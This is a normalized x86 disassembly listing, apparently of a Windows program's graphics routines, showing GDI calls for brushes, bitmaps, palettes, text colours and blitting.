mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_422210
xor edx edx
push ebp
push sub_423785
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42221c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4229f8
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_4237a0
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_4235ec
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_423608
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_4237d4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031ec
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_422ce4
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_424014
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423210
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_424034
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4234dc
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_424054
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_41a480
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_423898
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_41a51c
xor edx edx
mov eax esi
call sub_423e4c
mov eax [ esi + 0xc ]
call sub_40321c
mov eax [ esi + 0x10 ]
call sub_40321c
mov eax [ esi + 0x14 ]
call sub_40321c
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a714
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_4238f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_423ea0
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_423ea0
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_42397c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_423ea0
mov eax [ ebx + 0x14 ]
call sub_42367c
call sub_4229f8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_4229f8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_418d68
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_423a28
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_423ea0
mov eax [ ebx + 0x14 ]
call sub_4236b8
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_423a64
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_423ea0
mov eax [ ebx + 0x14 ]
call sub_4236b8
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_423aa0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_423ea0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_423b00
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_423ea0
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_423b2c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_423ea0
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_423b64
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_423ea0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_423bac
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_423ea0
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_423be8
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_423ea0
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_40422c
push eax
mov eax edi
call sub_40442c
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_423c2c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_423be8
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_423c48
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_423be8
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_423c68
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_423cb4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423cbb
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_423ad8
sub_423d14
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_423ea0
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_423d38
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_423b00
pop ecx
pop edx
pop edi
pop esi
retn
sub_423d58
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_423ea0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_423d84
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_423ea0
mov eax [ ebp + 0x8 ]
call sub_4229f8
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_423dec
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_423e4c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_423dec
mov edx esp
mov eax ebx
call sub_423d14
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_423d38
sub_423ea0
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_423f3c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
test bl 0x8
je r-xdata
mov eax esi
call sub_423f68
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_423f98
sub_423f3c
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_422ecc
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_4229f8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_423f68
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_4233cc
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_423f98
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_4236b8
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_4236b8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_423798
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_42367c
call sub_4229f8
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_42367c
call sub_4229f8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_4240c8
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_424112
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424119
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_42411c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_4241b8
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_4240c8
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_4041dc
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4241bf
lea eax [ ebp - 0x104 ]
call sub_403f6c
retn
sub_4241d4
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_424322
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_424291
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_42411c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_42411c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424329
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_424334
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_424368
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_4241c4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4245e8
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_4241c4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4245ef
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_4241c4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_42443b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_406cc8
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4245ef
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_4245fc
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_424634
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402c30
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_4246ac
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_424704
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_402988
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_424801
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424808
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_42481c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_4248a2
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_4248b4
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_402988
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_4246ac
